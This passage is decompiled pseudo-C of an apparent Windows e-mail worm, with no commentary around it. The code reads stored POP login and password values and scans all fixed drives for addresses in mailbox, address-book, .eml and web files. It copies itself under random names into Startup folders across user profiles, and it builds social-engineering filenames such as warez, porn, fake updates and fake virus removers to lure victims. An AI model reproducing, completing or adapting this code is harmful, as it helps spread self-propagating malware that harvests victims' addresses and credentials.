            L0040A0F0(ebp - 124, 4302452);
        }
        (save)ebp + -224;
        esi = 1;
        (save)1;
        (save)"Login";
        (save)ebx;
        (save)edi;
        L004066EB();
        (save)ebp + -224;
        (save)0x412e94;
        L0040A0F0();
        (save)ebp + -324;
        (save)esi;
        (save)"Pass";
        (save)ebx;
        (save)edi;
        L004066EB();
        (save)ebp + -324;
        (save)4302240;
        L0040A0F0();
        (save)ebp - 124;
        (save)esi;
        (save)"POP Server";
        (save)ebx;
        (save)edi;
        L004066EB();
        esp = esp + 76;
        (save)ebp - 124;
        (save)4302128;
        L0040A0F0();
        (save)15;
        (save)L00406850() + 10;
        (save)ebp + -224;
        L0040696B();
        (save)ebp + -224;
        (save)esi;
        (save)"X-ID";
        (save)ebx;
        (save)edi;
        L004066EB();
        (save)ebp + -224;
        (save)0x412e74;
        L0040A0F0();
        esp = esp + 48;
        *L0041A6D8 = esi;
        goto L004073d5;
L004073d2:
        esi = 1;
L004073d5:
        eax = esi;
        goto L00407281;
        return(1);
        esp = *(ebp - 24);
L004073e3:
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 0;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x004073F8 - 0x004075E2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004073F8()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252992;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 20;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    esi = *(ebp + 8);
    *esi = 0;
    if(!(eax = L00406850(4) - 1)) {
        if(!(eax = eax - 1)) {
            if(!(eax = eax - 1)) {
                if(eax = eax - 1) {
                    goto L004075ab;
                }
                eax = "I";
                if(L00406840(50) == 0) {
                    eax = "i";
                }
                L0040A100();
                if(!(eax = L00406850(3, esi, eax) - 1)) {
                    if(!(eax = eax - 1)) {
                        if(eax = eax - 1) {
                            goto L00407497;
                        }
                        (save)"nstaller";
                    } else {
                        (save)"nstallation";
                    }
                } else {
                    (save)"nstall";
                }
                (save)esi;
                L0040A100();
                (restore)ecx;
L00407497:
                if(L00406840(75) == 0) {
                    goto L004075ab;
                }
                (save)3;
                eax = L00406850();
L004074ae:
                (save)eax;
                (save)ebp - 36;
                eax = L0040696B();
L004074b8:
                (save)eax;
                (save)esi;
                L0040A100();
                esp = esp + 20;
                goto L004075ab;
            }
            eax = "U";
            if(L00406840(50) == 0) {
                eax = "u";
            }
            (save)eax;
            (save)esi;
            L0040A100();
            eax = "pdate";
            if(L00406840(50) == 0) {
                eax = "pgrade";
            }
        } else {
            eax = "P";
            if(L00406840(50) == 0) {
                eax = "p";
            }
            (save)eax;
            (save)esi;
            L0040A100();
            eax = "atch";
            if(L00406840(50) == 0) {
                eax = "ack";
            }
        }
        (save)eax;
        (save)esi;
        L0040A100();
        if(L00406840(75) == 0) {
            goto L004075ab;
        }
        (save)3;
        eax = L00406850() + 1;
        goto L004074ae;
    }
    eax = "Q";
    if(L00406840(50) == 0) {
        eax = "q";
    }
    (save)eax;
    (save)esi;
    L0040A100();
    if(L00406840(20) != 0) {
        (save)4;
        (save)L00406850();
        (save)ebp - 36;
        eax = L004068F4();
        goto L004074b8;
    }
    L0040A100(esi, L0040696B(), ebp - 36, 6);
L004075ab:
    if(L00406840(15) != 0) {
        *__imp__CharUpperA(esi);
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L004075d2;
    return(1);
    esp = *(ebp - 24);
    *(ebp - 4) = *(ebp - 4) | -1;
    esi = *(ebp + 8);
L004075d2:
    eax = esi;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x004075E3 - 0x0040772B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004075E3()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253008;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 20;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = 0;
    *(ebp - 4) = 0;
    edi = *(ebp + 8);
    eax = L0040ACB0(edi, 63);
    *(ebp - 36) = eax;
    if(eax != esi) {
        *eax = 0;
    }
    eax = L0040A210(edi);
    *(ebp - 28) = eax;
    if(*(ebp - 28) >= 5) {
        ebx = 46;
        if(L0040ACB0(edi, 46) != 0) {
            if(*(ebp + 12) == esi) {
                goto L004076d6;
            }
            (save)edi;
            *__imp__CharLowerA();
            if(*(ebp + 12) == esi) {
                goto L004076d6;
            }
            if(*(ebp - 28) <= 63 && *edi != 64) {
                eax = L0040ACB0(edi, 64);
                *(ebp - 36) = eax;
                if(eax != esi && *(eax - 1) != bl) {
                    esi = eax + 1;
                    if(*esi != bl && L0040ACB0(eax, ebx) != 0 && L0040ACB0(esi, 64) == 0 && L0040A070(edi, "spam") == 0 && L0040A070(edi, "delete") == 0) {
L004076d6:
                        for(*(ebp - 32) = 0; 1; *(ebp - 32) = *(ebp - 32) + 1) {
                            eax = *(ebp - 32);
                            if(eax >= *(ebp - 28)) {
                                break;
                            }
                            al = *(eax + edi);
                            if(al < 33 || al > 126) {
                                goto L00407717;
                            }
                        }
                        if(L0040ADA0(edi, "()<>,;:\\"[]") != 0) {
                            eax = 0;
L00407705:
                            *(ebp - 4) = *(ebp - 4) | -1;
                            goto L0040771d;
                        }
                        eax = 1;
                        goto L00407705;
                        return(1);
                        esp = *(ebp - 24);
                    }
                }
            }
        }
    }
L00407717:
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L0040771d:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040772C - 0x0040786B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040772C()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253024;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 292;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    edi = 0;
    *(ebp - 4) = 0;
    esi = 4302872;
    ecx = 4302872;
    L00401BE7();
    eax = L0040AA95(80000);
    *(ebp + -304) = eax;
    *(ebp - 28) = eax;
    if(eax != edi) {
        ebx = *__imp__GetLogicalDrives();
        for(*(ebp - 36) = ebx; 1; edi = edi + 1) {
            *(ebp + -300) = edi;
            if(edi >= 26) {
                break;
            }
            ecx = edi;
            if(!(ebx & 1 << cl)) {
                *(ebp + -296) = edi + 65;
                *(ebp + -295) = 58;
                *(ebp + -294) = 92;
                *(ebp + -293) = 0;
                (save)ebp + -296;
                if(*__imp__GetDriveTypeA() == 3) {
                    L0040786C(ebp + -296, *(ebp - 28), *(ebp + 8));
                }
            }
        }
        eax = *(ebp - 28);
        *(ebp + -308) = eax;
        (save) *(ebp + -308);
        L0040AB34();
        *esp = 0x412f00;
        (save)"%s\germs0.dbv";
        (save)ebp + -296;
        *__imp__wsprintfA();
        esp = esp + 12;
        ecx = esi;
        L00401C5A(ebp + -296);
        ecx = esi;
        L00401BE7();
        *L00412E0C = 1;
        eax = L004066EB(-2147483646, 4302344, "CacheBox Outfit", 1, "yes");
        goto L00407859;
        return(1);
        esp = *(ebp - 24);
    }
L00407859:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040786C - 0x00407B2F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040786C()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253040;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 872;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    (save) *(ebp + 16);
    L00408962();
    ebx = *(ebp + 8);
    (save)ebx;
    (restore)ecx;
    if(*(L0040A210() + ebx - 1) == 92) {
        *(L0040A210(ebx) + ebx - 1) = 0;
    }
    L0040A0F0();
    L0040A100(ebp + -876, "\*", ebp + -876, ebx);
    (save)ebp + -608;
    (save)ebp + -876;
    eax = *__imp__FindFirstFileA();
    *(ebp - 28) = eax;
    if(eax != -1) {
        edi = "%s\%s";
        for(esi = __imp__wsprintfA; 1; ebx = *(ebp + 8)) {
            if(*(ebp + -608) & 16) {
                *(ebp + -616) = 0;
                *(ebp + -612) = 0;
                (save)ebp + -564;
                *__imp__CharLowerA();
                ebx = L0040A1E0(ebp + -564, 46);
                *(ebp + -616) = ebx;
                if(ebx != 0) {
                    eax = L0040A070(ebx, "ht");
                    *(ebp + -612) = eax;
                    if(*(ebp + -612) != 0) {
                        goto L004079e4;
                    }
                    eax = L0040A070(ebx, "asp");
                    *(ebp + -612) = eax;
                    if(*(ebp + -612) != 0) {
                        goto L004079e4;
                    }
                    if(L0040D680(ebx, ".mbx") == 0 || L0040D680(ebx, ".dbx") == 0 || L0040D680(ebx, ".wab") == 0) {
                        goto L00407a57;
                    }
                    if(L0040D680(ebx, ".eml") == 0) {
L00407a57:
                        *esi(ebp + -288, edi, *(ebp + 8), ebp + -564);
                        (save)0;
                        (save)128;
                        (save)3;
                        (save)0;
                        (save)3;
                        (save)-2147483648;
                        (save)ebp + -288;
                        ebx = *__imp__CreateFileA();
                        *(ebp + -888) = ebx;
                        if(ebx != -1) {
                            (save)0;
                            (save)ebx;
                            eax = *__imp__GetFileSize();
                            *(ebp + -880) = eax;
                            if(*(ebp + -880) >= 80000) {
                                *(ebp + -880) = 79999;
                            }
                            (save)0;
                            (save)ebp + -884;
                            (save) *(ebp + -880);
                            (save) *(ebp + 12);
                            (save)ebx;
                            *__imp__ReadFile();
                            (save)ebx;
                            *__imp__CloseHandle();
                            if(*(ebp + -880) > 100) {
                                L00407CBA( *(ebp + 12), *(ebp + -880));
                                goto L00407af3;
L004079e4:
                                *esi();
                                L00407B30(ebp + -288, *(ebp + 12), ebp + -288, edi, *(ebp + 8), ebp + -564);
                            }
                        }
                    }
                }
            } else {
                if(L0040AAB0(ebp + -564, ".") != 0 && L0040AAB0(ebp + -564, "..") != 0) {
                    *esi();
                    L0040786C(ebp + -288, *(ebp + 12), *(ebp + 16), ebp + -288, edi, ebx, ebp + -564);
                }
            }
L00407af3:
            (save)ebp + -608;
            (save) *(ebp - 28);
            if(*__imp__FindNextFileA() == 0) {
                break;
            }
        }
        eax = *__imp__FindClose( *(ebp - 28));
        goto L00407b1d;
        return(1);
        esp = *(ebp - 24);
    }
L00407b1d:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00407B30 - 0x00407CB9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00407B30()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253056;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 36;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 4) = 0;
    (save)0;
    *__imp__Sleep();
    (save)0;
    (save)0;
    (save)3;
    (save)0;
    (save)3;
    (save)-2147483648;
    (save) *(ebp + 8);
    eax = *__imp__CreateFileA();
    esi = eax;
    *(ebp - 36) = esi;
    if(esi != -1) {
        (save)ebx;
        (save)esi;
        edi = *__imp__GetFileSize();
        *(ebp - 32) = edi;
        if(edi != -1) {
            if(edi < 50) {
                goto L00407c97;
            }
            if(edi > 80000) {
                edi = 79995;
                *(ebp - 32) = 79995;
            }
            (save)ebx;
            (save)ebp - 28;
            (save)edi;
            esi = *(ebp + 12);
            (save)esi;
            (save) *(ebp - 36);
            if(*__imp__ReadFile() != 0) {
                *(edi + esi) = bl;
                (save)esi;
                *__imp__CharLowerA();
                for(*(ebp - 44) = esi; 1; L00401B22(edi, 1)) {
                    edi = L0040A070(esi + 1, "mailto:");
                    *(ebp - 52) = edi;
                    if(edi == ebx) {
                        break;
                    }
                    esi = L0040ACB0(edi, 34);
                    *(ebp - 44) = esi;
                    if(esi == ebx) {
                        esi = L0040ACB0(edi, 39);
                        *(ebp - 44) = esi;
                        if(esi == ebx) {
                            break;
                        }
                    }
                    edx = esi - edi;
                    *(ebp - 40) = edx;
                    if(edx < 12) {
                        continue;
                    }
                    for(*(ebp - 48) = 7; 1; *(ebp - 48) = *(ebp - 48) + 1) {
                        eax = *(ebp - 48);
                        if(eax >= edx) {
                            goto L00407c4a;
                        }
                        eax = eax + edi;
                        cl = *eax;
                        if(cl > 32 && cl < 127) {
                            break;
                        }
                    }
                    edi = eax;
                    *(ebp - 52) = edi;
L00407c4a:
                    eax = esi - edi;
                    do {
                        eax = eax - 1;
                        *(ebp - 48) = eax;
                        if(eax <= 3) {
                            goto L00407c69;
                        }
                        ecx = eax + edi;
                        dl = *ecx;
                        if(dl <= 32) {
                            continue;
                        }
                    } while(dl >= 127);
                    *(ecx + 1) = bl;
L00407c69:
                    if(L004075E3(edi, 1) == 0) {
                        continue;
                    }
                    ecx = 4302872;
                }
            }
            (save) *(ebp - 36);
        } else {
L00407c97:
            (save)esi;
        }
        eax = *__imp__CloseHandle();
        goto L00407ca7;
        return(1);
        esp = *(ebp - 24);
    }
L00407ca7:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00407CBA - 0x00407E9B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00407CBA()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253072;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 116;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = "()<>,;:\\"[]?@";
    edi = ebp - 48;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    ebx = 0;
    *(ebp - 128) = 0;
    *(ebp - 4) = 0;
    (save)0;
    *__imp__Sleep();
    edi = *(ebp + 8);
    if(edi == ebx) {
        eax = 0;
L00407d05:
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        for(*(ebp - 28) = edi; 1; *(ebp - 128) = esi) {
            eax = *(ebp - 28) + 1;
            *(ebp - 52) = eax;
            eax = L0040ADE0(eax, 64, edi - eax + *(ebp + 12));
            *(ebp - 28) = eax;
            if(eax == ebx) {
                break;
            }
            eax = eax - edi;
            *(ebp + -132) = eax;
            *(ebp - 124) = ebx;
            for(ecx = eax - 1; 1; ecx = ecx - 1) {
                *(ebp - 116) = ecx;
                if(ecx < ebx) {
                    goto L00407d85;
                }
                esi = ecx + edi;
                dl = *esi;
                if(dl < 33 || dl > 126) {
                    break;
                }
                for(*(ebp - 120) = 0; 1; *(ebp - 120) = *(ebp - 120) + 1) {
                    if(*(ebp - 120) >= 13) {
                        goto L00407d71;
                    }
                    if(dl == *(ebp + *(ebp - 120) - 48)) {
                        break;
                    }
                }
                *(ebp - 124) = esi;
L00407d71:
                ebx = 0;
                if(*(ebp - 124) != 0) {
                    goto L00407d8f;
                }
            }
            *(ebp - 124) = ecx + edi;
L00407d85:
            if(*(ebp - 124) == ebx) {
                *(ebp - 124) = edi;
            } else {
L00407d8f:
                *(ebp - 124) = *(ebp - 124) + 1;
            }
            ecx = *(ebp - 28);
            if(ecx - *(ebp - 124) > 50 || ecx == *(ebp - 124)) {
                continue;
            }
            ecx = 0;
            *(ebp - 52) = 0;
            while(1) {
                eax = eax + 1;
                *(ebp - 116) = eax;
                if(eax >= *(ebp + 12)) {
                    goto L00407df4;
                }
                esi = eax + edi;
                dl = *esi;
                if(dl < 33 || dl > 126) {
                    break;
                }
                for(*(ebp - 120) = 0; 1; *(ebp - 120) = *(ebp - 120) + 1) {
                    if(*(ebp - 120) >= 13) {
                        goto L00407de1;
                    }
                    if(dl == *(ebp + *(ebp - 120) - 48)) {
                        break;
                    }
                }
                ecx = esi;
                *(ebp - 52) = ecx;
L00407de1:
                ebx = 0;
                if(ecx != 0) {
                    goto L00407dfc;
                }
            }
            ecx = eax + edi;
            *(ebp - 52) = ecx;
L00407df4:
            if(ecx == ebx) {
                continue;
            }
L00407dfc:
            eax = ecx - *(ebp - 28);
            *(ebp - 32) = eax;
            if(eax < 4 || eax > 50) {
                continue;
            }
            esi = ecx - *(ebp - 124);
            *(ebp - 32) = esi;
            if(esi > 60 || esi < 5) {
                continue;
            }
            L0040A590();
            L0040A460();
            esi = 1;
            if(L004075E3(ebp - 112, 1, ebp - 112, *(ebp - 124), esi, ebp - 112, ebx, 60) == 0) {
                continue;
            }
            ecx = 4302872;
            if(L00401B22(ebp - 112, esi) == 0) {
                continue;
            }
        }
        eax = *(ebp - 128);
        goto L00407d05;
        return(1);
        esp = *(ebp - 24);
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 0;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00407E9C - 0x00408002
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00407E9C()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253088;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 372;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    ebx = "Unfile";
    edi = 4302344;
    esi = -2147483646;
    if(L0040679E(-2147483646, 4302344, ebx, ebp + -388) == 0) {
        (save)5;
        (save)L00406850() + 3;
        (save)ebp + -388;
        L004068F4();
        (save)".";
        (save)ebp + -388;
        L0040A100();
        (save)ebp + -388;
        eax = L0040A210();
        *(ebp + -288) = eax;
        eax = ebp + *(ebp + -288) + -388;
        *(ebp - 32) = eax;
        (save)3;
        (save) *(ebp - 32);
        L004068F4();
        (save)ebp + -388;
        (save)1;
        (save)ebx;
        (save)edi;
        (save)esi;
        L004066EB();
        esp = esp + 52;
    }
    esi = __imp__wsprintfA;
    *__imp__wsprintfA(ebp + -284, "%s\%s", 0x412f00, ebp + -388);
    ebx = 0;
    (save)0;
    (save)128;
    (save)4;
    (save)0;
    (save)3;
    (save)1073741824;
    (save)ebp + -284;
    eax = *__imp__CreateFileA();
    edi = eax;
    *(ebp - 28) = edi;
    if(edi != -1) {
        *__imp__SetFilePointer();
        *esi(ebp + -284, "%s\r\n", *(ebp + 8));
        *__imp__WriteFile(edi, ebp + -284, L0040A210(ebp + -284), ebp + -288, ebx, edi, ebx, ebx, 2);
        (save)edi;
        goto L00407fea;
        return(1);
        esp = *(ebp - 24);
        (save) *(ebp - 28);
L00407fea:
        eax = *__imp__CloseHandle();
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00408003 - 0x00408443
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00408003()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253104;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 588;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    *(ebp + -156) = 0;
    ecx = 24;
    eax = 0;
    edi = ebp + -155;
    asm("rep stosd");
    *edi = eax;
    edi = edi + 4;
    *edi = al;
    edi = edi + 1;
    *(ebp + -604) = dl;
    ecx = 24;
    eax = 0;
    edi = ebp + -603;
    asm("rep stosd");
    *edi = eax;
    edi = edi + 4;
    *edi = al;
    edi = edi + 1;
    ecx = 7;
    esi = "\Start menu\Programs\Startup";
    edi = ebp - 56;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 1;
    esi = esi + 1;
    ecx = 6;
    esi = "Documents and Settings\";
    edi = ebp + -180;
    asm("rep movsd");
    esi = "Winnt\Profiles\";
    edi = ebp + -504;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    ecx = 5;
    esi = "abcdefghjklmnorstvwxyz";
    edi = ebp + -484;
    asm("rep movsd");
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    *edi = *esi;
    edi = edi + 1;
    esi = esi + 1;
    *(ebp + -488) = 3;
    (save)"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer";
    (save)ebp + -604;
    L0040A0F0();
    (save)"\Shell Folders";
    (save)ebp + -604;
    L0040A100();
    (save)ebp + -156;
    (save)"Startup";
    (save)ebp + -604;
    (save)-2147483647;
    esp = esp + 32;
    if(L0040679E() != 0) {
        (save)92;
        (save)ebp + -156;
        eax = L0040ACB0();
        *(ebp + -184) = eax;
        (save) *(ebp + -184) + 1;
        (save)ebp + -156;
        L0040A0F0();
        (save)92;
        (save)ebp + -156;
        eax = L0040ACB0();
        *(ebp + -184) = eax;
        (save) *(ebp + -184);
        (save)ebp + -156;
        L0040A0F0();
        (save)ebp - 56;
        (save)ebp + -156;
        esp = esp + 40;
        if(L0040D680() == 0) {
            *(ebp + -488) = 2;
        }
    }
    eax = 1;
    *(ebp + -452) = 1;
    ebx = "\";
    edi = ".exe";
    for(esi = __imp__CopyFileA; *(ebp + -452) <= 4; *(ebp + -452) = *(ebp + -452) + 1) {
        for(*(ebp + -456) = eax; *(ebp + -456) <= *(ebp + -488); eax = 1) {
            L0040A0F0(ebp + -448, *(ebp + 8));
            if(eax = *(ebp + -452) - 1) {
                (save)"Windows";
            } else {
                if(eax = eax - 1) {
                    (save)"WinMe";
                } else {
                    if(eax = eax - 1) {
                        (save)"Win95";
                    } else {
                        if(eax = eax - 1) {
                            goto L004081da;
                        }
                        (save)"Win98";
                    }
                }
            }
            (save)ebp + -448;
            L0040A100();
            (restore)ecx;
L004081da:
            if(eax = *(ebp + -456) - 1) {
                (save)"\All Users";
                (save)ebp + -448;
                L0040A100();
                (save)ebp - 56;
                (save)ebp + -448;
                L0040A100();
                esp = esp + 16;
            } else {
                if(eax = eax - 1) {
                    eax = ebp - 56;
                    goto L004081ef;
                }
                if(!(eax = eax - 1)) {
                    eax = ebp + -156;
L004081ef:
                    L0040A100(ebp + -448, eax);
                }
            }
            (save)ebp + -448;
            eax = *__imp__GetFileAttributesA();
            *(ebp + -188) = eax;
            if(!( *(ebp + -188) & 16) && eax != -1) {
                (save)6;
                (save)L00406850() + 4;
                (save)ebp + -604;
                L004068F4();
                (save)22;
                *(ebp + -604) = *(ebp + L00406850() + -484);
                (save)ebx;
                (save)ebp + -448;
                L0040A100();
                (save)ebp + -604;
                (save)ebp + -448;
                L0040A100();
                (save)edi;
                (save)ebp + -448;
                L0040A100();
                esp = esp + 40;
                (save)1;
                (save)ebp + -448;
                (save) *(ebp + 12);
                *esi();
            }
            *(ebp + -456) = *(ebp + -456) + 1;
        }
    }
    for(*(ebp + -452) = eax; 1; *(ebp + -452) = *(ebp + -452) + 1) {
        if(*(ebp + -452) > 2) {
            goto L00408431;
        }
        for(*(ebp + -456) = eax; *(ebp + -456) <= 3; *(ebp + -456) = *(ebp + -456) + 1) {
            for(*(ebp + -460) = eax; *(ebp + -460) < *(ebp + -488); eax = 1) {
                L0040A0F0(ebp + -448, *(ebp + 8));
                if(eax = *(ebp + -452) - 1) {
                    eax = ebp + -180;
                } else {
                    if(eax = eax - 1) {
                        goto L0040833f;
                    }
                    eax = ebp + -504;
                }
                L0040A100(ebp + -448, eax);
L0040833f:
                if(eax = *(ebp + -456) - 1) {
                    (save)"All Users";
                } else {
                    if(eax = eax - 1) {
                        (save)"Default User";
                    } else {
                        if(eax = eax - 1) {
                            goto L0040836f;
                        }
                        (save)"Administrator";
                    }
                }
                (save)ebp + -448;
                L0040A100();
                (restore)ecx;
L0040836f:
                if(eax = *(ebp + -460) - 1) {
                    eax = ebp - 56;
                } else {
                    if(eax = eax - 1) {
                        goto L00408395;
                    }
                    eax = ebp + -156;
                }
                L0040A100(ebp + -448, eax);
L00408395:
                (save)ebp + -448;
                eax = *__imp__GetFileAttributesA();
                *(ebp + -188) = eax;
                if(!( *(ebp + -188) & 16) && eax != -1) {
                    (save)6;
                    (save)L00406850() + 4;
                    (save)ebp + -604;
                    L004068F4();
                    (save)ebx;
                    (save)ebp + -448;
                    L0040A100();
                    (save)ebp + -604;
                    (save)ebp + -448;
                    L0040A100();
                    (save)edi;
                    (save)ebp + -448;
                    L0040A100();
                    esp = esp + 36;
                    *esi( *(ebp + 12), ebp + -448, 1);
                }
                *(ebp + -460) = *(ebp + -460) + 1;
            }
        }
    }
    return(1);
    esp = *(ebp - 24);
L00408431:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00408444 - 0x0040864D
 *	Argument size: 4
 *	Local size: 176
 *	Save regs size: 4
 */

L00408444(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffff50;
	/* unknown */ void  Vffffff54;
	/* unknown */ void  Vffffff58;
	/* unknown */ void  Vffffff5c;
	/* unknown */ void  Vffffff60;
	/* unknown */ void  Vffffff64;
	/* unknown */ void  Vffffff68;
	/* unknown */ void  Vffffff6c;
	/* unknown */ void  Vffffff70;
	/* unknown */ void  Vffffff74;
	/* unknown */ void  Vffffff78;
	/* unknown */ void  Vffffff7c;
	/* unknown */ void  Vffffff80;
	/* unknown */ void  Vffffff84;
	/* unknown */ void  Vffffff88;
	/* unknown */ void  Vffffff8c;
	/* unknown */ void  Vffffff90;
	/* unknown */ void  Vffffff94;
	/* unknown */ void  Vffffff98;
	/* unknown */ void  Vffffff9c;
	/* unknown */ void  Vffffffa0;
	/* unknown */ void  Vffffffa4;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffff98 = "Kazaa Lite";
    *A8 = 0;
    Vffffff9c = "KaZaA media desktop";
    Vffffffa0 = "KaZaA";
    Vffffffa4 = "WinRar";
    Vffffffa8 = "WinZip";
    Vffffffac = "Winamp";
    Vffffffb0 = "Mirc";
    Vffffffb4 = "Download Accelerator";
    Vffffffb8 = "GetRight FTP";
    Vffffffbc = "Windows Media Player";
    Vffffffc0 = "key generator";
    Vffffffc4 = "hack";
    Vffffffc8 = "hacked";
    Vffffffcc = "warez";
    Vffffffd0 = "upload";
    Vffffffd4 = "installer";
    Vffffffd8 = "Bugbear";
    Vffffffdc = "Yaha";
    Vffffffe0 = "Gibe";
    Vffffffe4 = "Sircam";
    Vffffffe8 = "Sobig";
    Vffffffec = "Klez";
    Vfffffff0 = "remover";
    Vfffffff4 = "removal tool";
    Vfffffff8 = "cleaner";
    Vfffffffc = "fixtool";
    Vffffff50 = "AOL hacker";
    Vffffff54 = "Yahoo hacker";
    Vffffff58 = "Hotmail hacker";
    Vffffff5c = "10.000 Serials";
    Vffffff60 = "Jenna Jameson";
    Vffffff64 = "HardPorn";
    Vffffff68 = "Sex";
    Vffffff6c = "XboX Emulator";
    Vffffff70 = "Emulator PS2";
    Vffffff74 = "XP update";
    Vffffff78 = "XXX Video";
    Vffffff7c = "Sick Joke";
    Vffffff80 = "XXX Pictures";
    Vffffff84 = "My naked sister";
    Vffffff88 = "Hallucinogenic Screensaver";
    Vffffff8c = "Cooking with Cannabis";
    Vffffff90 = "Magic Mushrooms Growing";
    Vffffff94 = "Virus Generator";
    if(L00406840(50) != 0) {
        (save)10;
        (save) *(ebp + L00406850() * 4 - 108);
        (save)A8;
        L0040A0F0();
        (save)" ";
        (save)A8;
        L0040A100();
        (save)6;
        (save) *(ebp + L00406850() * 4 - 68);
L004085df:
        (save)A8;
        L0040A100();
        esp = esp + 32;
    } else {
        if(L00406840(27) != 0) {
            (save)6;
            (save) *(ebp + L00406850() * 4 - 44);
